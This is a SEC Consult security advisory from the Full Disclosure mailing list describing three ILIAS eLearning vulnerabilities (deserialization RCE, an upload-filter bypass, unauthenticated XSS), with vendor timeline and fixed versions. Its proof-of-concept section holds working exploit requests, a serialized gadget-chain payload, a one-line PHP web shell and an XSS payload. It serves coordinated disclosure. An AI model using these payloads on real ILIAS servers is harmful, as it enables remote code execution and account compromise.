@@ -1,0 +1,706 @@
+
+Date: Tue, 27 Jun 2023 06:21:53 +0000
+From: "SEC Consult Vulnerability Lab,
+ Research via Fulldisclosure" <fulldisclosure@...lists.org>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] SEC Consult SA-20230627-0 :: Multiple high risk
+ vulnerabilities in ILIAS eLearning platform
+
+SEC Consult Vulnerability Lab Security Advisory < 20230627-0 >
+=======================================================================
+               title: Multiple high risk vulnerabilities
+             product: ILIAS eLearning platform
+  vulnerable version: see section "Vulnerable version" below
+       fixed version: see section "Solution" below
+          CVE number: -
+              impact: High
+            homepage: https://www.ilias.de
+               found: 2022-12-28
+                  by: Armin Stock (Atos)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Eviden business
+                      Europe | Asia
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Around since 1998, ILIAS is a powerful learning management system that fulfills
+all your requirements. Using its integrated tools, small and large businesses,
+universities, schools and public authorities are able to create tailored,
+individual learning scenarios."
+
+Source: https://www.ilias.de/en/
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult highly recommends to perform a thorough security review of the product
+conducted by security professionals to identify and resolve potential further
+security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated remote code execution (ilObjRoleGUI)
+The function `changeExistingObjectsObject` of the class `ilObjRoleGUI` passes
+user-controlled data to the `unserialize` function.
+
+-------------------------------------------------------------------------------
+# FILE: Services/AccessControl/classes/class.ilObjRoleGUI.php
+/**
+  * Change existing objects
+  * @return
+  */
+protected function changeExistingObjectsObject()
+{
+     global $DIC;
+
+     $tree = $DIC['tree'];
+     $rbacreview = $DIC['rbacreview'];
+     $rbacadmin = $DIC['rbacadmin'];
+
+     $mode = (int) $_POST['mode'];
+     $start = ($this->obj_ref_id == ROLE_FOLDER_ID ? ROOT_FOLDER_ID : $this->obj_ref_id);
+
+     $this->object->changeExistingObjects($start, $mode, unserialize(ilUtil::stripSlashes($_POST['type_filter'])));
+
+     ilUtil::sendSuccess($this->lng->txt('settings_saved'), true);
+     $this->ctrl->redirect($this, 'perm');
+}
+-------------------------------------------------------------------------------
+
+The user-controlled `POST` parameter `type_filter` is passed to the
+`unserialize` function. The function `ilUtil::stripSlashes` only tries to
+protect against `HTML injection` and does not interfere with the serialized payload.
+
+To be able to exploit this vulnerability it is required to have `edit_permission`
+on an object, which supports the `ilPermissionGUI` command and has a `ref_id`.
+Also an `obj_id` of a role is required. As an example the `course` object is used.
+
+-------------------------------------------------------------------------------
+# FILE: Services/AccessControl/classes/class.ilPermissionGUI.php
+public function executeCommand()
+{
+     global $DIC;
+
+     $rbacsystem = $DIC['rbacsystem'];
+     $ilErr = $DIC['ilErr'];
+
+
+     if (!$rbacsystem->checkAccess("edit_permission", $this->gui_obj->object->getRefId())) {
+         $ilErr->raiseError($this->lng->txt("permission_denied"), $ilErr->MESSAGE);
+     }
+
+     $next_class = $this->ctrl->getNextClass($this);
+
+     switch ($next_class) {
+         case "ilobjrolegui":
+             $this->ctrl->setReturn($this, 'perm');
+             include_once("Services/AccessControl/classes/class.ilObjRoleGUI.php");
+             $this->gui_obj = new ilObjRoleGUI("", (int) $_GET["obj_id"], false, false);
+             $ret = $this->ctrl->forwardCommand($this->gui_obj);
+             break;
+-------------------------------------------------------------------------------
+
+
+2) ilUtil::renameExecutables bypass allows PHP code execution
+The ILIAS platform uses the function `ilUtils::renameExecutables` in the
+`ilFileSystemGUI` class (used to upload or unzip files for various objects), to
+prevent the upload of executable files like `.php`.
+
+--------------------------------------------------------------------------------
+# File: ILIAS-7.17\Services\FileSystem\classes\class.ilFileSystemGUI.php
+/**
+* delete object file
+*/
+public function unzipFile($a_file = null)
+{
+     # ...
+     if (@is_file($a_file)) {
+         include_once("./Services/Utilities/classes/class.ilFileUtils.php");
+         $cur_files = array_keys(ilUtil::getDir($cur_dir));
+         $cur_files_r = iterator_to_array(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cur_dir)));
+
+         if ($this->getAllowDirectories()) {
+             ilUtil::unzip($a_file, true);
+         } else {
+             ilUtil::unzip($a_file, true, true);
+         }
+         # ...
+     }
+     # Call to renameExecutables, after a ZIP file has be unzipped
+     ilUtil::renameExecutables($this->main_dir);
+
+     $this->ctrl->saveParameter($this, self::CDIR);
+     ilUtil::sendSuccess($lng->txt("cont_file_unzipped"), true);
+     $this->ctrl->redirect($this, "listFiles");
+}
+--------------------------------------------------------------------------------
+
+This function changes the extension of all files, which have an extension
+specified in the variables `SUFFIX_REPL_DEFAULT` and `SUFFIX_REPL_ADDITIONAL` to
+`.sec`.
+
+--------------------------------------------------------------------------------
+# File: ILIAS-7.17\Services\Init\classes\class.ilInitialisation.php
+// define default suffix replacements
+define("SUFFIX_REPL_DEFAULT", "php,php3,php4,inc,lang,phtml,htaccess");
+define("SUFFIX_REPL_ADDITIONAL", $ilSetting->get("suffix_repl_additional"));
+
+# File: ILIAS-7.17\Services\Utilities\classes\class.ilUtil.php
+/**
+* Rename uploaded executables for security reasons.
+*
+* @static
+*
+*/
+public static function renameExecutables($a_dir)
+{
+     $def_arr = explode(",", SUFFIX_REPL_DEFAULT);
+     foreach ($def_arr as $def) {
+         ilUtil::rRenameSuffix($a_dir, trim($def), "sec");
+     }
+
+     $def_arr = explode(",", SUFFIX_REPL_ADDITIONAL);
+     foreach ($def_arr as $def) {
+         ilUtil::rRenameSuffix($a_dir, trim($def), "sec");
+     }
+}
+--------------------------------------------------------------------------------
+
+The `ilUtil::rRenameSuffix` is responsible for renaming the provided suffixes to
+the `sec` suffix. To achieve this it does the following:
+
+a) Iterate the provided directory, skipping the `.` and `..` files
+b) Test if the filename ends with a dot and removes it: `foo.php.` --> `foo.php`
+c) Test if the filename has the provided suffix and
+    replace it with `sec`: `foo.php` --> `foo.sec`
+
+--------------------------------------------------------------------------------
+/**
+* Renames all files with certain suffix and gives them a new suffix.
+* This words recursively through a directory.
+*
+* @param	string	$a_dir			directory
+* @param	string	$a_old_suffix	old suffix
+* @param	string	$a_new_suffix	new suffix
+*
+* @access	public
+* @static
+*
+*/
+public static function rRenameSuffix($a_dir, $a_old_suffix, $a_new_suffix)
+{
+     # ...
+     // read a_dir
+     $dir = opendir($a_dir);
+
+     while ($file = readdir($dir)) {
+         if ($file != "." and
+         $file != "..") {
+             // directories
+             if (@is_dir($a_dir . "/" . $file)) {
+                 ilUtil::rRenameSuffix($a_dir . "/" . $file, $a_old_suffix, $a_new_suffix);
+             }
+
+             // files
+             if (@is_file($a_dir . "/" . $file)) {
+                 // first check for files with trailing dot
+                 if (strrpos($file, '.') == (strlen($file) - 1)) {
+                     rename($a_dir . '/' . $file, substr($a_dir . '/' . $file, 0, -1));
+                     $file = substr($file, 0, -1);
+                 }
+
+                 $path_info = pathinfo($a_dir . "/" . $file);
+
+                 if (strtolower($path_info["extension"]) ==
+                 strtolower($a_old_suffix)) {
+                     $pos = strrpos($a_dir . "/" . $file, ".");
+                     $new_name = substr($a_dir . "/" . $file, 0, $pos) . "." . $a_new_suffix;
+                     rename($a_dir . "/" . $file, $new_name);
+                 }
+             }
+         }
+     }
+     return true;
+}
+--------------------------------------------------------------------------------
+
+The first test can be abused to generate a `PHP` warning. If the uploaded file
+has the name `...` it tries to rename it to `..` which is not possible and
+results in a warning:
+
+--------------------------------------------------------------------------------
+php > rename("./...", "..");
+PHP Warning:  rename(./...,..): Device or resource busy in php shell code on line 1
+--------------------------------------------------------------------------------
+
+This behavior by itself would be no problem, but `ILIAS` uses the
+`https://github.com/filp/whoops` library. This library turns `PHP` errors into
+exceptions (if not ignored by the `php.ini` value `error_reporting`). `ILIAS`
+recommends to set this variable to
+`error_reporting = E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT ; PHP 5.4.0 and higher`
+(see https://docu.ilias.de/goto_docu_lm_367.html), which would enable the
+warning and trigger the exception.
+
+As there is no `catch` block in the `rRenameSuffix` function the iteration of
+the directory is stopped and other files, which actually do have a `.php` suffix
+are not processed, resulting in an uploaded file with an unallowed suffix `.php`.
+
+
+3) Unauthenticated XSS via OpenIDConnect error message
+The ILIAS platform uses the `https://github.com/jumbojett/OpenID-Connect-PHP`
+library for its `OpenID-Connect` authentication implementation. During the call
+to the `OpenIDConnectClient::authenticate` function, this library accepts the
+`error_description` parameter from the `$_REQUEST` object, which is used for the
+error message in an exception. The code throws this exception, if the `error`
+parameter is also present in the `$_REQUEST` object.
+
+--------------------------------------------------------------------------------
+# FILE: ILIAS-7.17\libs\composer\vendor\jumbojett\openid-connect-php\src\OpenIDConnectClient.php
+/**
+  * @return bool
+  * @throws OpenIDConnectClientException
+  */
+public function authenticate() {
+
+     // Do a preemptive check to see if the provider has thrown an error from a previous redirect
+     if (isset($_REQUEST['error'])) {
+         $desc = isset($_REQUEST['error_description']) ? ' Description: ' . $_REQUEST['error_description'] : '';
+         throw new OpenIDConnectClientException('Error: ' . $_REQUEST['error'] .$desc);
+     }
+
+--------------------------------------------------------------------------------
+
+The implementation of the `OpenID-Connect` auth provider catches any exception
+thrown during the authentication process and uses the error message of the
+exception to set the current status of the login.
+
+--------------------------------------------------------------------------------
+# File: ILIAS-7.17\Services\OpenIdConnect\classes\class.ilAuthProviderOpenIdConnect.php
+/**
+  * Do authentication
+  * @param \ilAuthStatus $status Authentication status
+  * @return bool
+  */
+public function doAuthentication(\ilAuthStatus $status)
+{
+     try {
+         $oidc = $this->initClient();
+         $oidc->setRedirectURL(ILIAS_HTTP_PATH . '/openidconnect.php');
+
+         # ...
+         # Call OpenIDConnectClient::authenticate
+         $oidc->authenticate();
+         # ....
+     } catch (Exception $e) {
+         $this->getLogger()->warning($e->getMessage());
+         $this->getLogger()->warning($e->getCode());
+         $status->setStatus(ilAuthStatus::STATUS_AUTHENTICATION_FAILED);
+         # Set status message using the exception message, which is controlled
+         # by the attacker
+         $status->setTranslatedReason($e->getMessage());
+         return false;
+     }
+}
+--------------------------------------------------------------------------------
+
+Depending on status of the login, the
+`ilStartUpGUI::doOpenIdConnectAuthentication` function sends a failure message
+to the user based on the `$status->getTranslateReason()` text.
+
+--------------------------------------------------------------------------------
+/**
+  * do open id connect authentication
+  */
+protected function doOpenIdConnectAuthentication()
+{
+     global $DIC;
+
+     $this->getLogger()->debug('Trying openid connect authentication');
+     # ...
+     $frontend->authenticate();
+
+     switch ($status->getStatus()) {
+         case ilAuthStatus::STATUS_AUTHENTICATED:
+             # ...
+         case ilAuthStatus::STATUS_AUTHENTICATION_FAILED:
+             # Send failure message to the user
+             ilUtil::sendFailure($status->getTranslatedReason(), true);
+             $GLOBALS['ilCtrl']->redirect($this, 'showLoginPage');
+             return false;
+     }
+     # ...
+}
+--------------------------------------------------------------------------------
+
+This error message, which can contain `HTML` code is later displayed to the user
+by the error subsystem, which does not encode the error message. The messages
+are created based on the `tpl.message.html` template and rendered as the
+`{MESSAGE}` template variable.
+
+--------------------------------------------------------------------------------
+# File: ILIAS-7.17\Services\UICore\classes\class.ilGlobalTemplate.php
+/**
+  * Fill message area.
+  */
+private function fillMessage()
+{
+     global $DIC;
+
+     $out = "";
+
+     foreach (self::$message_types as $m) {
+         $txt = $this->getMessageTextForType($m);
+
+         if ($txt != "") {
+             $out .= ilUtil::getSystemMessageHTML($txt, $m);
+         }
+
+         $request = $DIC->http()->request();
+         $accept_header = $request->getHeaderLine('Accept');
+         if (isset($_SESSION[$m]) && $_SESSION[$m] && ($accept_header !== 'application/json')) {
+             unset($_SESSION[$m]);
+         }
+     }
+
+     if ($out != "") {
+         $this->setVariable("MESSAGE", $out);
+     }
+}
+
+# File: ILIAS-7.17\Services\Utilities\classes\class.ilUtil.php
+/**
+  * Get HTML for a system message
+  *
+  * ATTENTION: This method is deprecated. Use MessageBox from the
+  * UI-framework instead.
+  */
+public static function getSystemMessageHTML($a_txt, $a_type = "info")
+{
+     global $DIC;
+
+     $lng = $DIC->language();
+     $mtpl = new ilTemplate("tpl.message.html", true, true, "Services/Utilities");
+     $mtpl->setCurrentBlock($a_type . "_message");
+     $mtpl->setVariable("TEXT", $a_txt);
+     $mtpl->setVariable("MESSAGE_HEADING", $lng->txt($a_type . "_message"));
+     $mtpl->parseCurrentBlock();
+
+     return $mtpl->get();
+}
+--------------------------------------------------------------------------------
+
+
+Proof of concept:
+-----------------
+1) Authenticated remote code execution (ilObjRoleGUI)
+
+Prerequisite: User with `edit_permission` on a `course` object
+Parameter details:
+* ref_id=80 -> Course object
+* obj_id=4 -> Role object
+* cmdNode=wh:ln:ux:px -> Command flow denoted by CIDs (installation dependent)
+* cmd=changeExistingObjects -> Function to call on the `ilObjRoleGUI` object
+* type_filter -> payload, generated with [PHPGGC](https://github.com/ambionics/phpggc)
+                  `./phpggc -S Monolog/RCE5 system "touch /tmp/exploit"`
+
+CIDs:
+* wh = ilrepositorygui
+* ln = ilobjcoursegui
+* ux = ilpermissiongui
+* px = ilobjrolegui
+
+
+The following POST request exploits this issue and creates the file /tmp/exploit
+as a proof of concept:
+-------------------------------------------------------------------------------
+POST /ilias.php?ref_id=80&cmdClass=ilpermissiongui&cmdNode=wh:ln:ux:px&baseClass=ilrepositorygui&obj_id=4&cmd=changeExistingObjects HTTP/1.1
+Host: ilias.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://ilias.local:9080/ilias.php?ref_id=80&cmdClass=ilrepositorygui&cmdNode=wh&baseClass=ilrepositorygui
+Cookie: ilClientId=myilias; PHPSESSID=a29f6435073c76b3c6477a8b154c91e1; 
+1453197475={"any_entry_engaged":false,"tools_engaged":false,"more_available":false,"entries":{"0:0":[0,0,0],"0:1":[0,0,0],"0:1:1":[0,1,0],"0:1:2":[0,0,0],"0:2":[0,0,0],"0:2:0":[0,0,0],"0:2:1":[0,0,0],"0:3":[0,0,0],"0:4":[0,0,0],"0:5":[0,0,1]},"tools":{"696c434f50616765456469744753546f6f6c50726f76696465727c636f70675f656469746f72":[0,0,0,"T:0"]},"known_tools":["696c576f726b73706163654753546f6f6c50726f76696465727c74726565","696c434f50616765456469744753546f6f6c50726f76696465727c636f70675f656469746f72","4d61696c476c6f62616c53637265656e546f6f6c50726f76696465727c6d61696c5f666f6c646572735f74726565"],"last_active_top":"0:2"}; 
+il_mb_slates={"engaged":false}
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 495
+
+type_filter=<@urlencode>O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:18:"\74\6f\75\63\68\20\2f\74\6d\70\2f\65\78\70\6c\6f\69\74";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}
+<@/urlencode>
+-------------------------------------------------------------------------------
+
+After sending this request the file `/tmp/exploit` is created.
+
+-------------------------------------------------------------------------------
+user@...129388baa:/var/www/logs# ls -la /tmp
+total 16
+drwxrwxrwt 1 root     root     4096 Dec 28 06:07 .
+drwxr-xr-x 1 root     root     4096 Dec 26 04:12 ..
+-rw-r--r-- 1 www-data www-data    0 Dec 28 06:07 exploit
+-------------------------------------------------------------------------------
+
+
+2) ilUtil::renameExecutables bypass allows PHP code execution
+To exploit this issue the `MediaObject` object type can be used, as uploaded
+files are placed in a known directory which is accessible via the web server.
+This allows the execution of the `.php` script after uploading.
+
+As a first step a new `MediaObject` has to be created. Then the attacker has to
+navigate to `Properties -> Files` of this object. Afterwards a new `.zip` archive
+can be uploaded with the following content:
+
+--------------------------------------------------------------------------------
+=>  ILIAS unzip -l ilias-exploit-dot.zip
+Archive:  ilias-exploit-dot.zip
+   Length      Date    Time    Name
+---------  ---------- -----   ----
+        92  2022-12-27 01:28   exploit.php
+        35  1980-01-01 00:00   style_import/...
+        92  2022-12-27 01:28   style_import/exploit.php
+---------                     -------
+       219                     3 files
+--------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------
+#File: exploit.php
+<?php
+echo system($_GET["cmd"]);
+?>
+--------------------------------------------------------------------------------
+
+After uploading this archive it can be unzipped using the `unzip` command of
+`ilFileSystemGUI` class. During the unzip process the following exception
+occurs:
+
+--------------------------------------------------------------------------------
+Whoops\Exception\ErrorException thrown with message "rename(./data/myilias/mobs/mm_318/style_import/...,./data/myilias/mobs/mm_318/style_import/..): Device or resource busy"
+
+Stacktrace:
+#24 Whoops\Exception\ErrorException in /var/www/html/Services/Utilities/classes/class.ilUtil.php:3593
+#23 rename in /var/www/html/Services/Utilities/classes/class.ilUtil.php:3593
+#22 ilUtil:rRenameSuffix in /var/www/html/Services/Utilities/classes/class.ilUtil.php:3586
+#21 ilUtil:rRenameSuffix in /var/www/html/Services/Utilities/classes/class.ilUtil.php:3510
+#20 ilUtil:renameExecutables in /var/www/html/Services/FileSystem/classes/class.ilFileSystemGUI.php:926
+#19 ilFileSystemGUI:unzipFile in /var/www/html/Services/FileSystem/classes/class.ilFileSystemGUI.php:448
+#18 ilFileSystemGUI:extCommand in /var/www/html/Services/FileSystem/classes/class.ilFileSystemGUI.php:257
+#17 ilFileSystemGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#16 ilCtrl:forwardCommand in /var/www/html/Services/MediaObjects/classes/class.ilObjMediaObjectGUI.php:277
+#15 ilObjMediaObjectGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#14 ilCtrl:forwardCommand in /var/www/html/Services/COPage/classes/class.ilPCMediaObjectGUI.php:198
+#13 ilPCMediaObjectGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#12 ilCtrl:forwardCommand in /var/www/html/Services/COPage/classes/class.ilPageEditorGUI.php:401
+#11 ilPageEditorGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#10 ilCtrl:forwardCommand in /var/www/html/Services/COPage/classes/class.ilPageObjectGUI.php:1113
+#9 ilPageObjectGUI:executeCommand in /var/www/html/Modules/Blog/classes/class.ilBlogPostingGUI.php:166
+#8 ilBlogPostingGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#7 ilCtrl:forwardCommand in /var/www/html/Modules/Blog/classes/class.ilObjBlogGUI.php:697
+#6 ilObjBlogGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#5 ilCtrl:forwardCommand in /var/www/html/Services/PersonalWorkspace/classes/class.ilPersonalWorkspaceGUI.php:165
+#4 ilPersonalWorkspaceGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#3 ilCtrl:forwardCommand in /var/www/html/Services/Dashboard/classes/class.ilDashboardGUI.php:262
+#2 ilDashboardGUI:executeCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:217
+#1 ilCtrl:forwardCommand in /var/www/html/Services/UICore/classes/class.ilCtrl.php:178
+#0 ilCtrl:callBaseClass in /var/www/html/ilias.php:23
+--------------------------------------------------------------------------------
+
+As there is no exception processing present in the rename function it skips all
+other files, leaving the file `exploit.php` with the `.php` suffix as it is.
+
+--------------------------------------------------------------------------------
+root@...7b59b6950:/var/www/html/data/myilias/mobs/mm_318# ls -la ./**
+-rwxr-xr-x 1 www-data www-data   45 Jan 17 13:28 ./exploit.php
+-rw-r--r-- 1 www-data www-data  639 Jan 17 13:21 ./ilias-exploit-dot.zip
+
+./style_import:
+total 16
+drwxr-xr-x 2 www-data www-data 4096 Jan 17 13:21 .
+drwxr-xr-x 3 www-data www-data 4096 Jan 17 13:28 ..
+-rwxrwxrwx 1 www-data www-data   35 Jan  1  1980 ...
+-rwxr-xr-x 1 www-data www-data   92 Dec 27 01:28 exploit.sec
+
+--------------------------------------------------------------------------------
+
+As an example, the program `whoami` can then be executed with the following request
+via the uploaded PHP shell:
+--------------------------------------------------------------------------------
+GET /data/myilias/mobs/mm_318/exploit.php?cmd=whoami HTTP/1.1
+Host: ilias.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ilClientId=myilias; PHPSESSID=efb0b80d14d4ffa22369b1750ed26a6a; 
+1453197475={"any_entry_engaged":true,"tools_engaged":true,"more_available":false,"entries":{"0:0":[0,0,0],"0:1":[0,0,0],"0:1:1":[0,0,0],"0:1:2":[0,0,0],"0:2":[0,0,0],"0:2:0":[0,0,0],"0:2:1":[0,0,0],"0:3":[0,0,0],"0:4":[0,0,0],"0:5":[0,0,1]},"tools":{"696c434f50616765456469744753546f6f6c50726f76696465727c636f70675f656469746f72":[0,1,0,"T:0"],"696c576f726b73706163654753546f6f6c50726f76696465727c74726565":[0,0,0,"T:1"]},"known_tools":["696c434f50616765456469744753546f6f6c50726f76696465727c636f70675f656469746f72","696c576f726b73706163654753546f6f6c50726f76696465727c74726565"],"last_active_top":"0:2"}
+Upgrade-Insecure-Requests: 1
+
+
+--------------------------------------------------------------------------------
+
+Response:
+--------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Tue, 17 Jan 2023 13:28:32 GMT
+Server: Apache/2.4.52 (Debian)
+X-Powered-By: PHP/7.3.33
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 19
+
+www-data
+www-data
+
+--------------------------------------------------------------------------------
+
+
+3) Unauthenticated XSS via OpenIDConnect error message
+The following request can be used to trigger the vulnerability:
+
+--------------------------------------------------------------------------------
+GET /openidconnect.php?error=1&error_description=XSS-<script>alert(document.domain)</script> HTTP/1.1
+Host: ilias.local:9080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+--------------------------------------------------------------------------------
+
+The response to this request is a redirect to the URL
+(`/ilias.php?lang=de&cmd=showLoginPage&cmdClass=ilstartupgui&cmdNode=zq&baseClass=ilStartUpGUI`),
+which displays the error message and shows the `alert` box:
+
+--------------------------------------------------------------------------------
+HTTP/1.1 200 OK
+Date: Tue, 17 Jan 2023 10:03:06 GMT
+Server: Apache/2.4.52 (Debian)
+X-Powered-By: PHP/7.3.33
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 20369
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<!-- ... -->
+<div class="ilAdminRow">
+<div class="alert alert-danger" role="alert">
+<h5 class="ilAccHeadingHidden"><a id="il_message_focus">Fehlermeldung</a></h5>
+Error: 1 Description: XSS-<script>alert(document.domain)</script></div>
+</div>
+				
+<!-- ... -->	
+--------------------------------------------------------------------------------
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities were identified in ILIAS version v7.17 2022-12-21 which was
+the latest version available at the time of the test. Previous branches, such as
+version 6 are affected as well. Version 8 was not available at the time of the
+test yet, but fixes have been incorporated in the release as well.
+The identified vulnerabilities have been fixed in different versions (see
+solution section below). Hence the affected versions differ, depending on the
+vulnerability.
+* Vulnerability 1) <7.22 and <8.3
+* Vulnerability 2) <6.22, <7.18, <8.0
+* Vulnerability 3) <6.23, <7.19, <8.0
+
+
+Vendor contact timeline:
+------------------------
+2023-01-20: Contacting vendor through security@...ts.ilias.de and established
+             contact from previous advisory; quick vendor reply.
+2023-01-30: Vendor acknowledged the vulnerabilities
+2023-02-06: A fix for one of vulnerabilities was released
+2023-03-27: All vulnerabilities seem to be fixed in branch 7.xx, is release possible?
+2023-03-28: Vendor asked to postpone public release of advisory to end of May as
+             vulnerability 1) will be addressed with a more proper fix later.
+2023-05-22: Asking vendor about the timeline of the public release and the fixed
+             version in the different branches.
+2023-05-23: Vendor answers that vulnerability 1) is not fully fixed yet and
+             provides information regarding affected/fixed versions for 2) and 3).
+2023-05-31: Vendor provides update regarding timeline, fix for issue 1) is either
+             planned for 21st or 28th June in release v8.3. It is properly fixed
+             in v7.22. Asked to delay security advisory for one week after patch
+             publication.
+2023-06-01: Confirming timeline and advisory release date.
+2023-06-20: Asking for status update, if patch will be released on 21st or 28th
+             June.
+2023-06-20: Vendor: release is planned for today, scheduling advisory release for
+             27th June.
+2023-06-27: Coordinated release of security advisory.
+
+
+Solution:
+---------
+The vendor provides updated versions which mitigate the identified vulnerabilities.
+Vulnerability 1) is fixed in versions or higher: 7.22, 8.3
+Vulnerability 2) is fixed in versions or higher: 6.22, 7.18, 8.0
+Vulnerability 3) is fixed in versions or higher: 6.23, 7.19, 8.0
+
+The patches can be downloaded from the vendor's website where they also
+provide detailed changelogs for the patches:
+https://docu.ilias.de/ilias.php?ref_id=1719&obj_id=229&cmd=layout&cmdClass=illmpresentationgui&cmdNode=13g&baseClass=ilLMPresentationGUI
+
+
+SEC Consult recommends updating to the latest version available.
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+An integrated part of SEC Consult, an Eviden business
+Europe | Asia
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
+Eviden business. It ensures the continued knowledge gain of SEC Consult in the
+field of network and application security to stay ahead of the attacker. The
+SEC Consult Vulnerability Lab supports high-quality penetration testing and
+the evaluation of new offensive and defensive technologies for our customers.
+Hence our customers obtain the most current information about vulnerabilities
+and valid recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/career/
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/contact/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: security-research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF Armin Stock / @2023
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
